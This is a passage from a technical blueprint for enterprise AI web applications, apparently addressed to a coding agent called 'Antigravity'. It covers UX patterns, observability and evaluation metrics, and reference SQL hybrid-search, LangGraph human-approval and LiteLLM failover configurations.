
// 6. Human-in-the-Loop Interrupt Payload
{"type": "hitl_interrupt", "checkpoint_id": "chk_992", "action": "send_client_email", "proposed_args": {"to": "cfo@client.com"}}
```

### 9.2 Mandatory AI Web UX Patterns `[MANDATORY]`
Every professional AI web application built using this blueprint must include:
1.  **Collapsible Reasoning & Step Timeline**: Display real-time expandable accordions showing which sub-agent is active, what queries are being searched, and which tools are executing, collapsing neatly once the final answer begins streaming.
2.  **Interactive Citation Hover Cards & Split-Screen Source Viewer**: Clicking or hovering over an inline `[1]` badge must open a rich popover showing the document title, page number, relevance score, and highlighted quote snippet; clicking opens a side-by-side PDF/Document viewer scrolled directly to that chunk.
3.  **Inline HITL Approval Cards**: When an interrupt event arrives, render an interactive form card directly in the chat/workspace stream with editable parameter fields and **Approve**, **Modify & Run**, and **Reject** actions.
4.  **Stream Resilience & Reconnection**: Store in-flight stream tokens in Redis Streams so that if the user refreshes their browser tab mid-generation, the UI seamlessly reconnects and resumes streaming from the last received token offset.
5.  **Feedback & Regeneration Controls**: Include per-message Thumbs Up/Down (wired directly to observability traces), "Retry with Different Model", "Edit Message (Branch Thread)", and "Copy with Citations".

### 9.3 Generative UI (GenUI), Workspace Layout & Visual Theme `[ACCORDING TO PS]`
While the streaming infrastructure above is mandatory, the visual presentation and domain components must be tailored strictly **According to the Problem Statement**:
*   **Workspace Paradigm `[ACCORDING TO PS]`**:
    *   *Canvas / Artifact Split-View*: Ideal for coding assistants, document drafting, report generation, and system design.
    *   *Command Center / Data Dashboard with Embedded Copilot*: Ideal for FinTech, DevOps observability, Healthcare, and BI analytics.
    *   *Autonomous Workflow Board (Kanban/Graph View)*: Ideal for back-office automation, CRM orchestration, and multi-agent task pipelines.
*   **Domain-Specific Generative UI Components `[ACCORDING TO PS]`**: Map structured tool outputs directly to rich interactive React components (e.g., interactive Recharts/Visx financial charts, sortable data tables, diff viewers, interactive maps, or molecular viewers) rather than dumping plain Markdown tables.
*   **Visual Theme, Color Palette & Typography `[ACCORDING TO PS]`**: Select color tokens, contrast ratios, dark/light mode defaults, and font pairings (e.g., crisp monospace for developer/financial tools vs. warm editorial serif/sans pairings for legal/research platforms) that match the problem statement's brand and domain identity.

---

## 10. Observability, Evaluation (Evals) & LLMOps

You cannot optimize what you cannot measure. Every production AI system requires end-to-end telemetry and automated quality gates.

### 10.1 Distributed OpenTelemetry Tracing `[MANDATORY]`
*   Instrument every request with **OpenTelemetry** (exporting to Langfuse, LangSmith, Arize Phoenix, or Datadog LLM Observability).
*   A single user request (`trace_id`) must capture nested spans for:
    *   Guardrail latency & verdicts
    *   Query rewriting & embedding latency
    *   Dense + BM25 database retrieval latency & raw scores
    *   Cross-encoder reranking scores before and after filtering
    *   Every LangGraph node transition and state diff
    *   Exact rendered prompt sent to the LLM, model provider used, fallback attempts, TTFT, tokens/sec, input/output/cached token counts, and exact USD cost.

### 10.2 Automated RAG & Agent Evaluation Metrics `[MANDATORY]`
Implement continuous offline (CI/CD) and online (sampled production traffic) evaluation pipelines:
1.  **RAG Triad Metrics (RAGAS / TruLens)**:
    *   **Context Precision & Recall**: Are the ground-truth relevant chunks ranked at the top of the retrieved set?
    *   **Faithfulness (Groundedness)**: Ratio of claims in the generated response that can be directly inferred from the retrieved context:
        $$\text{Faithfulness} = \frac{|\text{Claims supported by retrieved context}|}{|\text{Total claims in response}|}$$
    *   **Answer Relevance**: Does the generated response directly address the user's original intent?
2.  **Agent Trajectory Metrics**:
    *   **Tool Selection Accuracy**: Did the agent choose the optimal tool and arguments compared to reference trajectories?
    *   **Step Efficiency**: Ratio of minimum required steps to actual steps taken ($E = \frac{S_{\text{optimal}}}{S_{\text{actual}}}$).

---

## 11. Reference Implementation Blueprints

Use the following reference patterns as structural templates when implementing backend and database modules.

### 11.1 Reference Pattern: PostgreSQL Hybrid Search (Dense `pgvector` + Sparse `BM25` + `RRF`) `[MANDATORY]`
```sql
-- Prerequisite Extensions
CREATE EXTENSION IF NOT EXISTS vector;
CREATE EXTENSION IF NOT EXISTS pg_trgm;

-- Production Document Chunks Table with Multi-Tenant RBAC & Hybrid Indices
CREATE TABLE IF NOT EXISTS knowledge_chunks (
    chunk_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    document_id UUID NOT NULL,
    parent_chunk_id UUID NULL,
    tenant_id TEXT NOT NULL,
    allowed_roles TEXT[] NOT NULL DEFAULT '{public}',
    source_title TEXT NOT NULL,
    source_uri TEXT NOT NULL,
    page_number INT NULL,
    content TEXT NOT NULL,
    contextualized_content TEXT NOT NULL,
    metadata JSONB NOT NULL DEFAULT '{}'::jsonb,
    content_hash TEXT NOT NULL UNIQUE,
    embedding vector(1536) NOT NULL,
    search_tsv tsvector GENERATED ALWAYS AS (to_tsvector('english', contextualized_content)) STORED,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- HNSW Index for Sub-10ms Dense Vector Search
CREATE INDEX IF NOT EXISTS idx_chunks_embedding_hnsw 
ON knowledge_chunks USING hnsw (embedding vector_cosine_ops) 
WITH (m = 16, ef_construction = 64);

-- GIN Index for Fast Lexical Full-Text Search & Metadata Filtering
CREATE INDEX IF NOT EXISTS idx_chunks_tsv_gin ON knowledge_chunks USING gin (search_tsv);
CREATE INDEX IF NOT EXISTS idx_chunks_tenant_roles ON knowledge_chunks USING gin (allowed_roles);
CREATE INDEX IF NOT EXISTS idx_chunks_tenant_id ON knowledge_chunks (tenant_id);

-- Hybrid Reciprocal Rank Fusion (RRF) Retrieval Query with Mandatory RBAC Pre-Filtering
WITH dense_results AS (
    SELECT 
        chunk_id,
        ROW_NUMBER() OVER (ORDER BY embedding <=> $1::vector) AS dense_rank
    FROM knowledge_chunks
    WHERE tenant_id = $2
      AND allowed_roles && $3::text[]
    ORDER BY embedding <=> $1::vector
    LIMIT 50
),
sparse_results AS (
    SELECT 
        chunk_id,
        ROW_NUMBER() OVER (ORDER BY ts_rank_cd(search_tsv, websearch_to_tsquery('english', $4)) DESC) AS sparse_rank
    FROM knowledge_chunks
    WHERE tenant_id = $2
      AND allowed_roles && $3::text[]
      AND search_tsv @@ websearch_to_tsquery('english', $4)
    ORDER BY ts_rank_cd(search_tsv, websearch_to_tsquery('english', $4)) DESC
    LIMIT 50
),
rrf_fused AS (
    SELECT
        COALESCE(d.chunk_id, s.chunk_id) AS chunk_id,
        COALESCE(1.0 / (60 + d.dense_rank), 0.0) + COALESCE(1.0 / (60 + s.sparse_rank), 0.0) AS rrf_score,
        d.dense_rank,
        s.sparse_rank
    FROM dense_results d
    FULL OUTER JOIN sparse_results s ON d.chunk_id = s.chunk_id
    ORDER BY rrf_score DESC
    LIMIT 30
)
SELECT 
    k.chunk_id,
    k.document_id,
    k.parent_chunk_id,
    k.source_title,
    k.source_uri,
    k.page_number,
    k.content,
    k.metadata,
    r.rrf_score
FROM rrf_fused r
JOIN knowledge_chunks k ON k.chunk_id = r.chunk_id
ORDER BY r.rrf_score DESC;
```

### 11.2 Reference Pattern: Stateful Multi-Agent Graph & State Schema (Python / LangGraph) `[MANDATORY]`
```python
from typing import Annotated, Literal, TypedDict, List, Dict, Any, Optional
from pydantic import BaseModel, Field
from langgraph.graph import StateGraph, START, END
from langgraph.graph.message import add_messages
from langgraph.types import interrupt, Command
from langchain_core.messages import BaseMessage, SystemMessage, AIMessage, ToolMessage

# 1. Custom Reducer for Deduplicating Retrieved RAG Citations Across Loop Steps
def merge_citations(existing: List[Dict[str, Any]], new: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    seen_ids = {item["chunk_id"] for item in (existing or [])}
    merged = list(existing or [])
    for item in (new or []):
        if item["chunk_id"] not in seen_ids:
            seen_ids.add(item["chunk_id"])
            merged.append(item)
    return merged

# 2. Explicit Graph State Schema
class AgentRuntimeState(TypedDict):
    messages: Annotated[List[BaseMessage], add_messages]
    tenant_id: str
    user_id: str
    user_roles: List[str]
    active_query: str
    rewritten_queries: List[str]
    retrieved_chunks: Annotated[List[Dict[str, Any]], merge_citations]
    user_memories: List[str]
    next_worker: Literal["rag_worker", "tool_worker", "hitl_gate", "synthesizer", "FINISH"]
    loop_step_count: int
    retrieval_retry_count: int
    error_state: Optional[str]

# 3. Strict Structured Output Schema for Supervisor Routing
class SupervisorDecision(BaseModel):
    reasoning: str = Field(description="Step-by-step rationale for selecting the next worker node.")
    next_worker: Literal["rag_worker", "tool_worker", "hitl_gate", "synthesizer", "FINISH"]
    refined_sub_query: Optional[str] = Field(default=None, description="Targeted query for the selected worker.")

# 4. Supervisor Node with Hard Loop Cap Enforcement
MAX_GRAPH_STEPS = 12

async def supervisor_node(state: AgentRuntimeState) -> Dict[str, Any]:
    current_steps = state.get("loop_step_count", 0) + 1
    
    # Mandatory Loop Cap Guardrail
    if current_steps >= MAX_GRAPH_STEPS:
        return {
            "next_worker": "synthesizer",
            "loop_step_count": current_steps,
            "error_state": "Max reasoning steps reached; synthesizing best available answer."
        }
    
    # Invoke Unified Gateway with Strict Structured Output (SupervisorDecision)
    # decision = await gateway.invoke_structured(SupervisorDecision, state)
    ...
    return {
        "next_worker": "rag_worker",
        "loop_step_count": current_steps
    }

# 5. Human-in-the-Loop (HITL) Approval Node
async def hitl_approval_node(state: AgentRuntimeState) -> Command[Literal["tool_worker", "supervisor"]]:
    last_msg = state["messages"][-1]
    proposed_tool_calls = getattr(last_msg, "tool_calls", [])
    
    # Pause execution, persist checkpoint to Redis, and emit payload to Web UI
    human_verdict = interrupt({
        "event": "approval_required",
        "proposed_tools": proposed_tool_calls,
        "instructions": "Approve, edit arguments, or reject execution."
    })
    
    if human_verdict.get("status") == "approved":
        return Command(goto="tool_worker")
    elif human_verdict.get("status") == "edited":
        # Update tool call arguments with human-modified payload before executing
        return Command(update={"messages": [human_verdict["updated_message"]]}, goto="tool_worker")
    else:
        rejection_msg = ToolMessage(
            tool_call_id=proposed_tool_calls[0]["id"],
            content=f"Action rejected by user. Feedback: {human_verdict.get('reason', 'No reason provided.')}"
        )
        return Command(update={"messages": [rejection_msg]}, goto="supervisor")
```

### 11.3 Reference Pattern: Unified AI Gateway & Failover Router Configuration (LiteLLM YAML) `[MANDATORY]`
```yaml
model_list:
  # Primary Tier-2 Workhorse: Anthropic Claude 3.7 Sonnet
  - model_name: enterprise-reasoning-primary
    litellm_params:
      model: anthropic/claude-3-7-sonnet-20250219
      api_key: os.environ/ANTHROPIC_API_KEY
      timeout: 30
      max_retries: 1

  # Fallback 1: AWS Bedrock Claude 3.7 Sonnet (Different Cloud Infrastructure)
  - model_name: enterprise-reasoning-fallback-bedrock
    litellm_params:
      model: bedrock/us.anthropic.claude-3-7-sonnet-20250219-v1:0
      aws_region_name: us-east-1
      timeout: 30

  # Fallback 2: OpenAI GPT-4o (Cross-Vendor Resilience)
  - model_name: enterprise-reasoning-fallback-openai
    litellm_params:
      model: openai/gpt-4o
      api_key: os.environ/OPENAI_API_KEY
      timeout: 30

  # Tier-1 Fast Router / Classifier / Query Rewriter
  - model_name: enterprise-fast-router
    litellm_params:
      model: gemini/gemini-2.5-flash
      api_key: os.environ/GEMINI_API_KEY
      timeout: 10

router_settings:
  routing_strategy: latency-based-routing
  num_retries: 2
  retry_after: 1
  allowed_fails: 3
  cooldown_time: 60 # Circuit breaker cooldown in seconds
  fallbacks:
    - enterprise-reasoning-primary:
        - enterprise-reasoning-fallback-bedrock
        - enterprise-reasoning-fallback-openai
  redis_host: os.environ/REDIS_HOST
  redis_port: os.environ/REDIS_PORT
```

---

## 12. Antigravity Implementation Checklist

Whenever you (Antigravity) are tasked with building or upgrading an AI web application using this knowledge base, execute the following verification sequence:

1.  **Step 1 — Analyze Problem Statement (`[ACCORDING TO PS]`)**:
    *   Identify the domain personas, required external tools, input data modalities (PDF, SQL, Code, Audio), HITL risk thresholds, workspace layout paradigm (Canvas vs. Dashboard vs. Copilot), and visual theme/branding.
2.  **Step 2 — Scaffold Core Mandatory Infrastructure (`[MANDATORY]`)**:
    *   Set up the Unified AI Gateway with primary + fallback model chains and strict schema validation.
    *   Define the explicit `TypedDict`/`Pydantic` Graph State Schema with reducers and hard recursion/loop caps.
    *   Provision the Hybrid RAG pipeline (`pgvector` dense + `BM25` sparse + `RRF` fusion + Cross-Encoder Reranker + RBAC pre-filtering + deterministic `[1]` citation mapping).
    *   Configure Multi-Tier Memory (Redis short-term thread checkpointer + Postgres/Vector long-term fact store with background consolidation).
    *   Implement Dynamic Context Budgeting, XML-structured prompts, and Input/Output Guardrails.
    *   Wire up the SSE/Data-Stream protocol to stream real-time agent thoughts, active tool badges, interactive citation cards, and inline HITL approval forms to the web frontend.